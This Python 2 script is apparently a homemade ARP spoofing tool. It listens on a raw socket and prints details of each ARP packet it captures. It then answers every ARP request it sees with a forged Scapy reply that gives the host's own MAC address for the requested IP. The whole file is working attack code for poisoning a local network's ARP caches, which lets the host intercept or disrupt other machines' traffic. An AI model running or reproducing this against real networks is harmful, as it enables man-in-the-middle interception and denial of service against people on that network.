import socket
import struct
import binascii
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)
import uuid
# make row socket to listen 
rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
#get My IP address
my_ip = socket.gethostbyname(socket.gethostname())
# get My MAC Address
my_mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
#while used to capture packets until keyboard/error interrupt
while True:
    #Grab a packet
    packet = rawSocket.recvfrom(2048)
    #Extratct Ethernet Header from captured packe
    ethernet_header = packet[0][0:14]
    #extract Ethernet Details ( MAC for source and destination
    ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header)
    #extract ARP header from captured packet
    arp_header = packet[0][14:42]
    #extract ARP Details ( MAC for source and destination IP for source & destination - Type of ARP packet
    arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)
    #extract Hex formated Source MAC address
    True_mac = ':'.join(''.join(pair) for pair in zip(*[iter(binascii.hexlify(arp_detailed[5]))]*2))
    # skip non-ARP packets
    ethertype = ethernet_detailed[2]
    if ethertype != '\x08\x06':
        continue
    ######## This section is useful for troubleshoot###############
    #print "Dest Raw Mac : ", binascii.hexlify(ethernet_detailed[1])
    #print "My Mac : ", my_mac
    #print "My Row Mac :" , uuid.getnode()
    #print "Dest Mac:", True_mac
    #print my_mac != True_mac
    #print "************************************\n"
    #skip packets than my system generated
    if my_mac == True_mac :
	continue
    #OPcode = 1 ==> Request // OPcode = 2 ===> Response
    print "Opcode:          ", binascii.hexlify(arp_detailed[4])
    print "Source MAC:      ", binascii.hexlify(arp_detailed[5])
    print "Source IP:       ", socket.inet_ntoa(arp_detailed[6])
    print "Dest MAC:        ", binascii.hexlify(arp_detailed[7])
    print "Dest IP:         ", socket.inet_ntoa(arp_detailed[8])
    print "My MAc:          ", my_mac
    print "My IP:           :", my_ip 
    print "=========================\n"
    #Generate ARP reply to answer any ARP request with my MAC!!!
    pkt = Ether(dst=True_mac) / ARP(op=2 , hwsrc=my_mac, psrc=socket.inet_ntoa(arp_detailed[8]), pdst=socket.inet_ntoa(arp_detailed[6]), hwdst=True_mac)
    #print Generated Packet details
    pkt.show()
    #Sending Crafted Packet
    sendp(pkt)
    #exit()